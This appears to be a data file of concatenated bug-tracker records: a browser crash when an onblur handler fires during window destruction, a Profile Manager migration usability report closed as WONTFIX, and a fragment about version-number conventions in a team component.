See scopus 368139.; ; My *guess* is we are trying to invoke on blur on an object in a window that at; least in part doesnt exist; hence the memory violation. Once we get a destroy; and start processing it should we set a flag to cause any subsequent events on; the widget to be discarded; or should we call the toolkit (e.g.; Gtk+) to; disable further events?; ; (gdb) where; #0  0x808080c in ??

() from /lib/libc.so.6,VERIFIED,DUPLICATE,[TITLE] Title: [DOGFOOD] JS attempt to call onblur handler crashes when window is coming down | [DESC] Description: We are trying to process a focus out event signal while in the context of; processing window destroy event; which may be what is leading to this crash; but; I wouldnt really want to guess. The problem is seen on Linux; by clicking on; the window manager close box. See scopus 368139.; ; My *guess* is we are trying to invoke on blur on an object in a window that at; least in part doesnt exist; hence the memory violation. Once we get a destroy; and start processing it should we set a flag to cause any subsequent events on; the widget to be discarded; or should we call the toolkit (e.g.; Gtk+) to; disable further events?; ; (gdb) where; #0  0x808080c in ??

This forces the; user to manually choose the PM icon if they want to migrate some of their; previous 4.x profiles after successfully (or even unsuccessfully) migrating a; single 4.x profile.  Some scenarios might make this clearer:; ; 1. User has a single 4.x profile; ================================; - Automigration happens (Profile Manager doesnt display); - If failure of automigration; and they choose Create new a default;empty; profile is created.; - Profile manager now has a valid 6.0 profile to use so PM never shows up again; unless the user explicitly chooses it.; - User is confused by the fact that they have none of their bookmarks; mail;; news; etc.; - This is nasty for the more inexperienced user because they never chose nor; wanted multiple profiles.  Now they have two and they one theyre using is not; the one they want.; ; 2. User has multiple 4.x profiles; =================================; - Profile Manger displays and asks them to choose a profile; - They choose and get the migration necessary dialog; - If failure happens and they choose Create New.; - PM now has a valid 6.0 profile to use so it never shows up again unless the; user explicitly chooses it.; - User is confused because they are used to seeing the PM come up everytime in; 4.x (because they had multiple profiles).  Now they only have a single; empty one.; - This scenario is the same even if a successful migration happens because PM; only shows up automatically if there are more than one valid 6.0 profiles.; ; The fix for these (and likely other) scenarios is to show the PM every time; there are multiple profiles whether they are 6.0 or 4.x profiles. | [META] Component: Profile: BackEnd | [META] Status: RESOLVED | [META] Resolution: WONTFIX,2

The; 	problem with trying to assign meaning to major and minor version numbers is that (1) they are determined; 	by convention and (2) valid version numbers are determined by the adapter; e.g. in CVS you cant have a; 	period in the version number but you can have an underscore; so by convention underscore separates; 	major and minor version numbers. But in another adapter; you may be allowed to use . but NOT _; in that; 	case the convention would be different.; ; 	After we re-engineer our API this may be easier to accomplish. | [META] Component: Team | [META] Status: RESOLVED | [META] Resolution: WONTFIX,3
